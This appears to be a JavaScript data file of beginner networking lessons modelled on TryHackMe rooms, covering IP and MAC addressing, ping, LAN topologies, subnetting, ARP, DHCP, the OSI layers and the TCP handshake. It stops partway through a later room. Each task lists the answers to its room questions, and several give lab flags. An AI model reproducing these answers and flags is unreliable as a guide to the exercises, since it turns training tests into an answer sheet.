      {icon:"🌐", title:"Network Fundamentals", intro:"Every security professional needs to understand the network fundamentals. This module will introduce the core concepts of computer networking, covering everything from the Internet Protocol (IP), network topologies, TCP and UDP protocols of the OSI Transport Layer. Don’t worry if that sounds complicated, as this modules labs uses fun beginner friendly exercises and real-world examples to help guide your learning.", text:"Learn the core concepts of how computers communicate with each other and types of network weaknesses.",
       rooms:[
        {name:"What is Networking?", text:"Begin learning the fundamentals of computer networking in this bite-sized and interactive module.",
         icon:"🌐", level:"easy", time:"30 min",
         tasks:[
          {title:"What is Networking?", notes:`
            <p>At its heart, a <b>network</b> is simply a collection of interconnected computing devices—laptops, smartphones, database servers, smart printers, and IoT sensors—that can exchange data, communicate, and share digital resources with one another.</p>
            <p>Before networking existed, sharing information between two separate computers required physically copying files onto punch cards, magnetic tapes, or floppy disks (affectionately called <i>sneakernet</i>). Today, networking allows billions of machines to instantly communicate across the globe.</p>
            <h3>Core Motivations for Networking</h3>
            <ul>
              <li><b>Resource Sharing:</b> Multiple computers can share expensive peripherals (like high-volume printers) or centralized storage (NAS / cloud drives).</li>
              <li><b>Instant Communication:</b> Sending emails, streaming audio/video, or transmitting sensor data in real time.</li>
              <li><b>Distributed Computing:</b> Splitting massive mathematical computations or database queries across dozens of synchronized worker nodes.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the key term for devices that are connected together?</i> <b>Network</b></li>
            </ul>`},

          {title:"What is the Internet?", notes:`
            <p>The <b>Internet</b> is a colossal "network of networks." It links billions of smaller private, academic, commercial, and government networks together through standardized global communication protocols.</p>
            <h3>A Quick History</h3>
            <ul>
              <li><b>ARPANET (Late 1960s):</b> Funded by the US Department of Defense's Advanced Research Projects Agency (DARPA). It pioneered <i>packet switching</i>—breaking data into individual chunks that can travel across alternative redundant paths rather than relying on a single dedicated telephone circuit.</li>
              <li><b>World Wide Web (1989):</b> Invented by British computer scientist <b>Tim Berners-Lee</b> while working at CERN. It introduced HTTP, HTML, and URL web links, transforming the raw networking infrastructure into an easy-to-use multimedia information system.</li>
            </ul>
            <p class="callout"><b>Important Distinction:</b> The <i>Internet</i> is the global underlying physical and routing infrastructure (cables, routers, switches, IP protocol). The <i>World Wide Web</i> is just one popular application layer service that operates on top of the Internet!</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Who invented the World Wide Web?</i> <b>Tim Berners-Lee</b></li>
            </ul>`},

          {title:"Identifying Devices on a Network", notes:`
            <p>For data to travel across a network and reach the right recipient, every connected device must be uniquely identified. Networks use two complementary address systems: <b>IP Addresses</b> (logical) and <b>MAC Addresses</b> (physical).</p>

            <h3>1. IP Addresses (Logical Addressing)</h3>
            <p>An <b>Internet Protocol (IP) address</b> identifies where a device is currently located on a network, much like a mailing postal address:</p>
            <ul>
              <li><b>IPv4 (Internet Protocol version 4):</b> A 32-bit numeric address formatted into <b>4 sections</b> called <b>octets</b>, separated by periods (e.g. <code>192.168.1.1</code>).</li>
              <li>Each octet consists of 8 bits, meaning its value can range from <code>0</code> to <code>255</code> (2<sup>8</sup> = 256 possibilities).</li>
              <li><b>IPv6 (Internet Protocol version 6):</b> Created to prevent address exhaustion. It uses 128 bits represented in 8 groups of 4 hexadecimal characters (e.g., <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>), providing over 3.4 × 10<sup>38</sup> unique addresses.</li>
              <li><b>Public vs. Private IPs:</b> Private IPs (such as <code>192.168.x.x</code> or <code>10.x.x.x</code>) are reserved for use within your home or office local network. Public IPs are globally routable across the entire Internet.</li>
            </ul>

            <h3>2. MAC Addresses (Physical Addressing)</h3>
            <p>A <b>Media Access Control (MAC) address</b> is a permanent, physical identifier assigned to a computer's <b>Network Interface Card (NIC)</b> by the manufacturer:</p>
            <ul>
              <li>Composed of <b>12 hexadecimal characters</b> grouped into 6 pairs (48 bits in total), such as <code>18:AC:33:12:88:29</code> or <code>01-00-AB-78-99-33</code>.</li>
              <li><b>OUI (Organizationally Unique Identifier):</b> The first 6 characters identify the manufacturer (Intel, Apple, Cisco, etc.).</li>
              <li><b>Device Identifier:</b> The remaining 6 characters uniquely identify that specific card.</li>
              <li><b>MAC Spoofing:</b> While the MAC is permanently burnt into physical hardware, operating systems allow users to overwrite the reported MAC in software. Attackers use MAC spoofing to bypass captive portals (like hotel Wi-Fi) or masquerade as trusted devices.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What does the term "IP" stand for?</i> <b>Internet Protocol</b></li>
              <li><i>What is each section of an IP address called?</i> <b>octet</b></li>
              <li><i>How many sections (octets) does an IP address have?</i> <b>4</b></li>
              <li><i>What does the term "MAC" stand for?</i> <b>Media Access Control</b></li>
              <li><i>Complete the hotel Wi-Fi lab. What is the flag?</i> <b>THM{YOU_GOT_ON_TRYHACKME}</b></li>
            </ul>`},

          {title:"Ping (ICMP)", notes:`
            <p><b>Ping</b> is one of the most fundamental network troubleshooting tools. It uses the <b>ICMP (Internet Control Message Protocol)</b> to test whether a remote host is online and measures round-trip transmission latency.</p>
            <h3>How Ping Works</h3>
            <p>When you ping an IP address or domain name, your operating system generates an <b>ICMP Echo Request</b> packet. When the destination host receives it, it replies with an <b>ICMP Echo Reply</b>:</p>
            <pre><code>cmnatic@CMNatic-THM-LPTOP:~$ ping 192.168.1.254
PING 192.168.1.254 (192.168.1.254) 56(84) bytes of data.
64 bytes from 192.168.1.254: icmp_seq=1 ttl=63 time=2.18 ms
64 bytes from 192.168.1.254: icmp_seq=2 ttl=63 time=2.53 ms
64 bytes from 192.168.1.254: icmp_seq=3 ttl=63 time=2.15 ms
64 bytes from 192.168.1.254: icmp_seq=4 ttl=63 time=3.34 ms
64 bytes from 192.168.1.254: icmp_seq=5 ttl=63 time=10.3 ms
64 bytes from 192.168.1.254: icmp_seq=6 ttl=63 time=4.45 ms
^C
--- 192.168.1.254 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5008ms
rtt min/avg/max/mdev = 2.152/4.160/10.313/2.864 ms</code></pre>
            <h3>Key Metrics in Ping Output</h3>
            <ul>
              <li><code>bytes</code>: The payload size sent in each packet (typically 56 or 64 bytes).</li>
              <li><code>icmp_seq</code>: Packet sequence counter. Missing numbers indicate dropped packets.</li>
              <li><code>ttl (Time to Live)</code>: Hop limit counter. Helps identify the target OS and routing hops.</li>
              <li><code>time</code>: Latency in milliseconds (ms) for the packet to make a round trip.</li>
              <li><code>packet loss</code>: Percentage of packets that did not return. A healthy connection has 0% packet loss.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What protocol does ping use?</i> <b>ICMP</b></li>
              <li><i>What is the syntax to ping 10.10.10.10?</i> <b>ping 10.10.10.10</b></li>
              <li><i>What flag do you get when you ping 8.8.8.8?</i> <b>THM{I_PINGED_THE_SERVER}</b></li>
            </ul>`},

          {title:"Continue Your Learning: Intro to LAN", notes:`
            <p>You have mastered the foundational building blocks of computer networking:</p>
            <ul>
              <li>What defines a network and how the Internet was formed.</li>
              <li>The difference between logical IP addresses (IPv4/IPv6) and physical hardware MAC addresses.</li>
              <li>How to use Ping and ICMP to verify host connectivity and measure response times.</li>
            </ul>
            <p>In the next room, <b>Intro to LAN</b>, you will learn how computers physically interconnect using Star, Bus, and Ring topologies, and how Switches, Routers, Subnetting, ARP, and DHCP work.</p>`}
         ]},

        {name:"Intro to LAN", text:"Learn about some of the technologies and designs that power private networks.",
         icon:"🔌", level:"easy", time:"15 min",
         tasks:[
          {title:"Introducing LAN Topologies", notes:`
            <p>A <b>Local Area Network (LAN)</b> is a computer network covering a localized geographical area such as a home, school, library, or office building. The physical or logical layout of how devices and cabling connect is called the <b>network topology</b>.</p>
            ${networkTopologySVG()}
            <h3>Comparison of Common Topologies</h3>
            <table>
              <tr><th>Topology</th><th>How It Works</th><th>Advantages</th><th>Disadvantages</th></tr>
              <tr>
                <td><b>Star Topology</b></td>
                <td>Every device connects independently to a central device (switch or hub).</td>
                <td>Highly reliable and scalable. If one cable breaks, only that one computer is disconnected.</td>
                <td>More expensive due to dedicated cabling; the central switch is a Single Point of Failure (SPOF).</td>
              </tr>
              <tr>
                <td><b>Bus Topology</b></td>
                <td>All devices connect to a single central "backbone" cable terminated at both ends.</td>
                <td>Very cheap and simple to set up; requires minimal cabling.</td>
                <td>High packet collision risk; a break anywhere along the backbone cable brings down the entire network!</td>
              </tr>
              <tr>
                <td><b>Ring Topology</b></td>
                <td>Devices connect in a continuous circular loop. Data passes from node to node (token ring).</td>
                <td>Predictable performance; eliminates data collisions via token passing.</td>
                <td>Slow; if a single computer or cable in the loop fails, the entire network fails.</td>
              </tr>
            </table>

            <h3>Key Hardware Devices</h3>
            <ul>
              <li><b>Switch:</b> An intelligent central device operating at Layer 2. It inspects the destination MAC address of incoming frames and delivers data exclusively to the correct recipient port, eliminating the collisions of older hubs.</li>
              <li><b>Router:</b> A Layer 3 device whose job is connecting distinct networks together and directing traffic between them via <b>routing</b>.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What does LAN stand for?</i> <b>Local Area Network</b></li>
              <li><i>What is the verb given to the job that Routers perform?</i> <b>Routing</b></li>
              <li><i>What device is used to centrally connect multiple devices on the local network and transmit data to the correct location?</i> <b>Switch</b></li>
              <li><i>What topology is cost-efficient to set up?</i> <b>Bus Topology</b></li>
              <li><i>What topology is expensive to set up and maintain?</i> <b>Star Topology</b></li>
              <li><i>Complete the interactive lab attached to this task. What is the flag given at the end?</i> <b>THM{TOPOLOGY_FLAWS}</b></li>
            </ul>`},

          {title:"A Primer on Subnetting", notes:`
            <p><b>Subnetting</b> is the practice of dividing a large physical network into smaller, isolated logical subnetworks (subnets). Think of it like slicing up a large cake so that each department or group receives its own slice.</p>
            <h3>Why Do We Subnet?</h3>
            <ul>
              <li><b>Efficiency:</b> Stops broadcast traffic from flooding across the entire company network.</li>
              <li><b>Security:</b> Isolates sensitive infrastructure (e.g., accounting servers and POS card readers) from public guest Wi-Fi.</li>
              <li><b>Access Control:</b> Allows network firewalls to enforce strict policies between subnets.</li>
            </ul>

            <h3>Subnet Masks</h3>
            <p>Like an IPv4 address, a <b>subnet mask</b> is <b>32 bits</b> long (4 octets, each 0–255, e.g. <code>255.255.255.0</code>). It acts as a filter telling routers which part of the IP address specifies the network, and which part specifies the specific device.</p>

            <h3>The Three Crucial Subnet Addresses</h3>
            <table>
              <tr><th>Address Type</th><th>Purpose &amp; Description</th><th>Example (for 192.168.1.x)</th></tr>
              <tr>
                <td><b>Network Address</b></td>
                <td>Identifies the network itself. Always the very first address in the subnet (host bits = 0). Cannot be assigned to any individual host.</td>
                <td><code>192.168.1.0</code></td>
              </tr>
              <tr>
                <td><b>Host Address</b></td>
                <td>Any usable address assigned to a client, server, or printer on that subnet.</td>
                <td><code>192.168.1.100</code></td>
              </tr>
              <tr>
                <td><b>Default Gateway</b></td>
                <td>The router interface IP on the subnet. Any data destined outside the local network is sent here to be routed to the Internet. Usually the first or last host address (.1 or .254).</td>
                <td><code>192.168.1.254</code></td>
              </tr>
            </table>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the technical term for dividing a network up into smaller pieces?</i> <b>Subnetting</b></li>
              <li><i>How many bits are in a subnet mask?</i> <b>32</b></li>
              <li><i>What is the range of a section (octet) of a subnet mask?</i> <b>0-255</b></li>
              <li><i>What address is used to identify the start of a network?</i> <b>Network Address</b></li>
              <li><i>What address is used to identify devices within a network?</i> <b>Host Address</b></li>
              <li><i>What is the name used to identify the device responsible for sending data to another network?</i> <b>Default Gateway</b></li>
            </ul>`},

          {title:"ARP", notes:`
            <p><b>ARP (Address Resolution Protocol)</b> is the glue connecting Layer 3 (logical IP addresses) to Layer 2 (physical MAC hardware addresses). While software uses IP addresses to decide where data should go, local switches and Ethernet cards can only transmit frames using physical MAC addresses.</p>
            <h3>How ARP Works</h3>
            <p>Every network device maintains an internal cache called the <b>ARP Table</b>. When computer A wants to send data to IP <code>192.168.1.10</code>:</p>
            <ol>
              <li><b>Cache Check:</b> Computer A checks its ARP table to see if it already knows the MAC address for <code>192.168.1.10</code>.</li>
              <li><b>ARP Request:</b> If not found, Computer A sends a broadcast frame to destination MAC <code>FF:FF:FF:FF:FF:FF</code> asking: <i>"Who has IP address 192.168.1.10? Tell 192.168.1.1"</i>. Every device on the local network hears this request.</li>
              <li><b>ARP Reply:</b> The device that owns <code>192.168.1.10</code> replies directly (unicast) to Computer A: <i>"I have 192.168.1.10, and my MAC is 18:AC:33:12:88:29"</i>.</li>
              <li><b>Cache Storage:</b> Computer A records this mapping in its ARP cache and transmits the pending Ethernet frame.</li>
            </ol>
            <p class="callout"><b>Security Insight (ARP Poisoning):</b> ARP has no authentication! An attacker on the local network can send fraudulent unsolicited ARP replies telling your computer that the default gateway's MAC address is actually the attacker's MAC. This Man-in-the-Middle (MITM) attack allows them to sniff or tamper with all your traffic.</p>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What does ARP stand for?</i> <b>Address Resolution Protocol</b></li>
              <li><i>What category of ARP Packet asks a device whether or not it has a specific IP address?</i> <b>Request</b></li>
              <li><i>What address is used as a physical identifier for a device on a network?</i> <b>MAC Address</b></li>
              <li><i>What address is used as a logical identifier for a device on a network?</i> <b>IP Address</b></li>
            </ul>`},

          {title:"DHCP", notes:`
            <p><b>DHCP (Dynamic Host Configuration Protocol)</b> automates network setup. Without DHCP, a network administrator would have to manually type an IP address, subnet mask, default gateway, and DNS servers into every single phone, tablet, and computer that connects!</p>
            ${dhcpDoraSVG()}
            <h3>The 4-Step DHCP "D.O.R.A." Handshake</h3>
            <ol>
              <li><b>Discover (DHCP Discover):</b> The client device powers on or joins Wi-Fi without an IP address. It broadcasts a message across the LAN: <i>"Hey, I'm new here! Is there any DHCP server that can give me an IP address?"</i></li>
              <li><b>Offer (DHCP Offer):</b> The DHCP server hears the broadcast, checks its available address pool, and responds with an offered IP configuration (e.g. <code>192.168.1.10</code>, subnet mask <code>255.255.255.0</code>, gateway <code>192.168.1.254</code>).</li>
              <li><b>Request (DHCP Request):</b> The client broadcasts back: <i>"Thank you! I accept and would like to lease 192.168.1.10."</i></li>
              <li><b>Acknowledge (DHCP ACK):</b> The DHCP server sends a final confirmation acknowledging the lease for a specified duration (e.g., 24 hours). The client can now fully use the network.</li>
            </ol>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What type of DHCP packet is used by a device to retrieve an IP address?</i> <b>DHCP Discover</b></li>
              <li><i>What type of DHCP packet does a device send once it has been offered an IP address by the DHCP server?</i> <b>DHCP Request</b></li>
              <li><i>Finally, what is the last DHCP packet that is sent to a device from a DHCP server?</i> <b>DHCP ACK</b></li>
            </ul>`},

          {title:"Continue Your Learning: OSI Model", notes:`
            <p>In this room, you discovered how local networks operate behind the scenes:</p>
            <ul>
              <li>Network topologies: Star, Bus, and Ring architectures.</li>
              <li>How switches and routers separate and connect subnets.</li>
              <li>The 3 critical subnet roles: Network address, Host address, and Default Gateway.</li>
              <li>How ARP resolves IP addresses to physical MAC hardware addresses.</li>
              <li>How DHCP leases IP addresses automatically via the D.O.R.A. handshake.</li>
            </ul>
            <p>Next up: Learn how networking engineers conceptualize the entire transmission pipeline across seven standardized layers in the <b>OSI Model</b>.</p>`}
         ]},

        {name:"OSI Model", text:"Learn about the fundamental networking framework that determines the various stages in which data is handled across a network.",
         icon:"🥞", level:"easy", time:"30 min",
         tasks:[
          {title:"What is the OSI Model?", notes:`
            <p>The <b>OSI (Open Systems Interconnection) model</b> is a conceptual framework created in 1984 by the International Organization for Standardization (ISO). It standardizes the functions of a telecommunication or computing system into <b>7 distinct layers</b>.</p>
            ${osiLayersSVG()}
            <p>By dividing networking into layers, software developers and hardware engineers can build specialized protocols independently without worrying about the underlying physical medium or higher-level user interface.</p>
            <h3>Encapsulation &amp; Decapsulation</h3>
            <ul>
              <li><b>Encapsulation (Sending):</b> When you send an email or request a web page, data starts at Layer 7 and travels down to Layer 1. Each layer prepends its own metadata (called a <i>header</i>) to the payload.</li>
              <li><b>Decapsulation (Receiving):</b> When the recipient computer receives raw electrical/radio signals at Layer 1, it reads each layer's header, strips it off, and passes the payload upwards until the original message reaches the application.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What does the "OSI" in "OSI Model" stand for?</i> <b>Open Systems Interconnection</b></li>
              <li><i>How many layers (in digits) does the OSI model have?</i> <b>7</b></li>
              <li><i>What is the key term for when pieces of information get added to data?</i> <b>encapsulation</b></li>
            </ul>`},

          {title:"Layer 1 - Physical", notes:`
            <p><b>Layer 1 (Physical Layer)</b> is the lowest layer of the OSI model. It is responsible for transmitting raw, unstructured bit streams (0s and 1s) over a physical transmission medium.</p>
            <h3>Core Functions &amp; Components</h3>
            <ul>
              <li><b>Signals:</b> Converts digital binary data into electrical voltages (over copper), light pulses (over fiber optics), or radio waves (over Wi-Fi).</li>
              <li><b>Cables:</b> Twisted-pair <b>Ethernet Cables</b> (Cat5e, Cat6 with 8-pin RJ-45 connectors) and fiber-optic cables.</li>
              <li><b>Hardware:</b> Network hubs, repeaters, wireless access point antennas, and transceiver chips.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Physical</b></li>
              <li><i>What is the name of the numbering system that is both 0's and 1's?</i> <b>Binary</b></li>
              <li><i>What is the name of the cables that are used to connect devices?</i> <b>Ethernet Cables</b></li>
            </ul>`},

          {title:"Layer 2 - Data Link", notes:`
            <p><b>Layer 2 (Data Link Layer)</b> focuses on physical addressing and node-to-node data transfer across the same local network segment. The Protocol Data Unit (PDU) at Layer 2 is the <b>Frame</b>.</p>
            <h3>Key Concepts</h3>
            <ul>
              <li><b>Network Interface Card (NIC):</b> Every network device contains a NIC hardware chip programmed with a permanent, factory-assigned <b>MAC address</b>.</li>
              <li><b>Framing:</b> Wraps the Layer 3 IP packet with a MAC source header, MAC destination header, and a Frame Check Sequence (FCS) error-detecting trailer.</li>
              <li><b>Switches:</b> Network switches operate at Layer 2, using internal MAC address tables to route frames directly to the intended port.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Data Link</b></li>
              <li><i>What is the name of the piece of hardware that all networked devices come with?</i> <b>Network Interface Card</b></li>
            </ul>`},

          {title:"Layer 3 - Network", notes:`
            <p><b>Layer 3 (Network Layer)</b> is where routing and logical addressing happen. It allows packets to travel across completely different networks across the globe. The PDU at Layer 3 is the <b>Packet</b>.</p>
            <h3>Key Concepts &amp; Protocols</h3>
            <ul>
              <li><b>IP Addresses:</b> Logical addresses (IPv4 / IPv6) that indicate the network and host identity across the global Internet.</li>
              <li><b>Routers:</b> Dedicated Layer 3 devices that inspect destination IP addresses and consult routing tables to forward packets along the most optimal path.</li>
              <li><b>Routing Protocols:</b> Protocols that dynamically discover the best path:
                <ul>
                  <li><b>OSPF (Open Shortest Path First):</b> Uses link-state algorithms to find the fastest, lowest-cost route based on bandwidth.</li>
                  <li><b>RIP (Routing Information Protocol):</b> Uses hop count (number of router hops) to calculate distance.</li>
                </ul>
              </li>
              <li><b>ICMP:</b> Internet Control Message Protocol (used by tools like <code>ping</code> and <code>traceroute</code>) operates at this layer.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Network</b></li>
              <li><i>Will packets take the most optimal route across a network? (Y/N)</i> <b>Y</b></li>
              <li><i>What does the acronym "OSPF" stand for?</i> <b>Open Shortest Path First</b></li>
              <li><i>What does the acronym "RIP" stand for?</i> <b>Routing Information Protocol</b></li>
              <li><i>What type of addresses are dealt with at this layer?</i> <b>IP Addresses</b></li>
            </ul>`},

          {title:"Layer 4 - Transport", notes:`
            <p><b>Layer 4 (Transport Layer)</b> manages end-to-end communication, session multiplexing via <b>port numbers</b>, and reliability between two host applications. The PDU is the <b>Segment</b> (TCP) or <b>Datagram</b> (UDP).</p>
            <h3>TCP vs. UDP Protocol Comparison</h3>
            <table>
              <tr><th>Protocol</th><th>Characteristics</th><th>Pros &amp; Cons</th><th>Common Use Cases</th></tr>
              <tr>
                <td><b>TCP (Transmission Control Protocol)</b></td>
                <td>Connection-oriented. Establishes a 3-way handshake before transmitting data. Numbers every segment, sends acknowledgments, and retransmits lost data.</td>
                <td><b>Pro:</b> Guarantees data accuracy and ordering.<br><b>Con:</b> Slower due to overhead and handshake latency.</td>
                <td>Web browsing (HTTP/HTTPS), file downloads (FTP), email (SMTP/IMAP), shell access (SSH).</td>
              </tr>
              <tr>
                <td><b>UDP (User Datagram Protocol)</b></td>
                <td>Connectionless and stateless. Sends packets ("fire-and-forget") without checking if the receiver is ready or if packets arrive.</td>
                <td><b>Pro:</b> Extremely fast with minimal header overhead.<br><b>Con:</b> No delivery guarantee or ordering.</td>
                <td>Live video streaming, VoIP voice calls, online gaming, DNS queries, DHCP.</td>
              </tr>
            </table>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Transport</b></li>
              <li><i>What does TCP stand for?</i> <b>Transmission Control Protocol</b></li>
              <li><i>What does UDP stand for?</i> <b>User Datagram Protocol</b></li>
              <li><i>What protocol guarantees the accuracy of data?</i> <b>TCP</b></li>
              <li><i>What protocol doesn't care if data is received or not by the other device?</i> <b>UDP</b></li>
              <li><i>What protocol would an application such as an email client use?</i> <b>TCP</b></li>
              <li><i>What protocol would an application that downloads files use?</i> <b>TCP</b></li>
              <li><i>What protocol would an application that streams video use?</i> <b>UDP</b></li>
            </ul>`},

          {title:"Layer 5 - Session", notes:`
            <p><b>Layer 5 (Session Layer)</b> is responsible for creating, coordinating, keeping alive, and terminating communication sessions between applications on different devices.</p>
            <h3>Core Functions</h3>
            <ul>
              <li><b>Session Establishment &amp; Teardown:</b> Creates a unique session channel when an app connects and closes it when finished or timed out.</li>
              <li><b>Checkpoints &amp; Synchronization:</b> If a large 500 MB file transfer drops at 400 MB, session checkpoints enable the transfer to resume from the last checkpoint rather than restarting from zero.</li>
              <li><b>Isolation:</b> Ensures that data from one active session never leaks into another concurrent session.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this layer?</i> <b>Session</b></li>
              <li><i>What is the technical term for when a connection is succesfully established?</i> <b>Session</b></li>
            </ul>`},

          {title:"Layer 6 - Presentation", notes:`
            <p><b>Layer 6 (Presentation Layer)</b> acts as the network's <b>translator</b> and data formatter. It ensures that data sent from the application layer of one system can be understood by the application layer of another system, regardless of operating system differences.</p>
            <h3>Key Responsibilities</h3>
            <ul>
              <li><b>Translation:</b> Translating between data encodings (e.g., converting ASCII or UTF-8 characters to internal machine formats).</li>
              <li><b>Encryption &amp; Decryption:</b> Handling cryptographic security, such as SSL/TLS encryption used when browsing HTTPS websites.</li>
              <li><b>Data Compression:</b> Compressing data to optimize throughput and save bandwidth before transmission.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Presentation</b></li>
              <li><i>What is the main purpose that this Layer acts as?</i> <b>Translator</b></li>
            </ul>`},

          {title:"Layer 7 - Application", notes:`
            <p><b>Layer 7 (Application Layer)</b> is the topmost layer, sitting directly closest to the end user. It provides network protocols that software applications (like Chrome, Firefox, Outlook, and FileZilla) utilize to send and receive data.</p>
            <h3>Key Application Layer Protocols</h3>
            <ul>
              <li><b>HTTP / HTTPS:</b> Hypertext Transfer Protocol (ports 80 / 443) for fetching web pages.</li>
              <li><b>DNS:</b> Domain Name System (port 53) translating domain names to IP addresses.</li>
              <li><b>FTP / SFTP:</b> File Transfer Protocol (ports 20/21, 22) for transferring files.</li>
              <li><b>SMTP / IMAP / POP3:</b> Email transmission and retrieval.</li>
              <li><b>Graphical User Interface (GUI):</b> The user-facing software interface through which users interact with these protocols.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name of this Layer?</i> <b>Application</b></li>
              <li><i>What is the technical term that is given to the name of the software that users interact with?</i> <b>Graphical User Interface</b></li>
            </ul>`},

          {title:"Practical - OSI Game", notes:`
            <p>In this hands-on interactive challenge, you escape the OSI dungeon by correctly matching and climbing each layer in order from Layer 1 (Physical) to Layer 7 (Application):</p>
            <ol>
              <li><b>Layer 1 (Physical):</b> Hardware cables, binary electrical signals, hubs.</li>
              <li><b>Layer 2 (Data Link):</b> MAC addresses, Ethernet frames, NIC, switches.</li>
              <li><b>Layer 3 (Network):</b> IP addresses, packets, routing, OSPF, RIP, routers.</li>
              <li><b>Layer 4 (Transport):</b> TCP, UDP, port numbers, reliability, segments.</li>
              <li><b>Layer 5 (Session):</b> Session management, checkpoints, authentication tokens.</li>
              <li><b>Layer 6 (Presentation):</b> Data formatting, SSL/TLS encryption, compression.</li>
              <li><b>Layer 7 (Application):</b> HTTP, DNS, GUI browsers, email clients.</li>
            </ol>
            <p>Completing the dungeon reveals the flag: <code>THM{OSI_DUNGEON_ESCAPED}</code>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Escape the dungeon to retrieve the flag. What is the flag?</i> <b>THM{OSI_DUNGEON_ESCAPED}</b></li>
            </ul>`},

          {title:"Continue Your Learning: Packets & Frames", notes:`
            <p>Congratulations on mastering the 7-layer OSI Model framework! You now understand:</p>
            <ul>
              <li>How encapsulation and decapsulation move data up and down the stack.</li>
              <li>The role of every single layer from Physical (L1) to Application (L7).</li>
              <li>Why TCP is used for accuracy while UDP is used for high-speed streaming.</li>
            </ul>
            <p>In the next room, <b>Packets &amp; Frames</b>, you will examine the exact structure of network packets and frames, break down the TCP 3-Way Handshake, and master port numbers.</p>`}
         ]},

        {name:"Packets & Frames", text:"Understand how data is divided into smaller pieces and transmitted across a network to another device.",
         icon:"📦", level:"easy", time:"30 min",
         tasks:[
          {title:"What are Packets and Frames", notes:`
            <p>When you download an image or stream music, the file is never transmitted across the network as one single block. Instead, it is divided into small, manageable chunks called <b>packets</b> and <b>frames</b>.</p>
            ${encapsulationFlowSVG()}
            <h3>Packets vs. Frames: What's the Difference?</h3>
            <ul>
              <li><b>Packet (Layer 3 - Network Layer):</b> Contains Layer 3 logical addressing, specifically the Source IP and Destination IP addresses, along with transport segment data.</li>
              <li><b>Frame (Layer 2 - Data Link Layer):</b> Wraps around the packet like an envelope. It contains Layer 2 physical addressing, specifically the Source MAC and Destination MAC addresses, plus a cyclic redundancy check (CRC/trailer) to detect data corruption.</li>
              <li><i>The Letter Analogy:</i> The packet is the letter containing the written message. The frame is the physical envelope stamped with the local address that the postal carrier carries. Once delivered, the envelope is discarded and the recipient reads the letter inside.</li>
            </ul>

            <h3>Crucial Packet Header Fields</h3>
            <table>
              <tr><th>Header Field</th><th>Purpose &amp; Behavior</th></tr>
              <tr>
                <td><b>Time to Live (TTL)</b></td>
                <td>An 8-bit counter decremented by 1 at every router hop. If TTL reaches 0 before reaching the destination, the packet is discarded and an ICMP Time Exceeded message is returned. This prevents discarded packets from looping infinitely through misconfigured routers.</td>
              </tr>
              <tr>
                <td><b>Checksum</b></td>
                <td>A mathematical integrity check. If even a single bit of the packet is altered or corrupted during transit, the receiving machine's calculated checksum will not match, and the packet is immediately discarded.</td>
              </tr>
              <tr>
                <td><b>Source Address</b></td>
                <td>The IP address of the sending device, allowing recipient devices and services to route reply packets back to the source.</td>
              </tr>
              <tr>
                <td><b>Destination Address</b></td>
                <td>The IP address of the intended receiving device.</td>
              </tr>
            </table>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the name for a piece of data when it does have IP addressing information?</i> <b>Packet</b></li>
              <li><i>What is the name for a piece of data when it does not have IP addressing information?</i> <b>Frame</b></li>
            </ul>`},

          {title:"TCP/IP (The Three-Way Handshake)", notes:`
            <p>The <b>Transmission Control Protocol (TCP)</b> is connection-based. Before client and server exchange any real application data, they must formally establish a synchronized connection via the <b>Three-Way Handshake</b>.</p>
            ${tcpHandshakeSVG()}
            <h3>The Three Steps of the Handshake</h3>
            <ol>
              <li><b>1. SYN (Synchronize):</b> The client generates a random Initial Sequence Number (e.g. <code>ISN = 0</code>) and sends a TCP segment with the <b>SYN</b> flag set to the server: <i>"Hello Bob! I would like to establish a connection. My initial sequence number is 0."</i></li>
              <li><b>2. SYN/ACK (Synchronize-Acknowledge):</b> The server responds by acknowledging the client's sequence number (<code>Ack = 0 + 1 = 1</code>) and provides its own Initial Sequence Number (e.g. <code>ISN = 0</code>): <i>"Hello Alice! I acknowledge your request and am ready. My sequence number is 0."</i></li>
              <li><b>3. ACK (Acknowledge):</b> The client replies with an <b>ACK</b> acknowledging the server's sequence number (<code>Ack = 0 + 1 = 1</code>): <i>"Received and confirmed! Our connection is established."</i></li>
            </ol>

            <h3>TCP Flags Overview</h3>
            <ul>
              <li><code>SYN</code>: Synchronize sequence numbers to initiate a connection.</li>
              <li><code>ACK</code>: Acknowledge successful receipt of packets.</li>
              <li><code>FIN</code>: Cleanly and politely close an active connection (Teardown: <code>FIN</code> &rarr; <code>ACK</code> &rarr; <code>FIN</code> &rarr; <code>ACK</code>).</li>
              <li><code>RST</code>: Reset the connection abruptly due to an error, invalid packet, or closed port.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the header in a TCP packet that ensures the integrity of data?</i> <b>checksum</b></li>
              <li><i>Provide the order of a normal Three-way handshake (with each step separated by a comma)</i> <b>SYN,SYN/ACK,ACK</b></li>
            </ul>`},

          {title:"Practical - Handshake", notes:`
            <p>In this interactive practical exercise, you assist Alice and Bob in re-assembling a valid TCP 3-way handshake in proper chronological order:</p>
            <ol>
              <li>Send <b>SYN</b> from Alice to Bob.</li>
              <li>Receive <b>SYN-ACK</b> from Bob to Alice.</li>
              <li>Send <b>ACK</b> from Alice to Bob.</li>
            </ol>
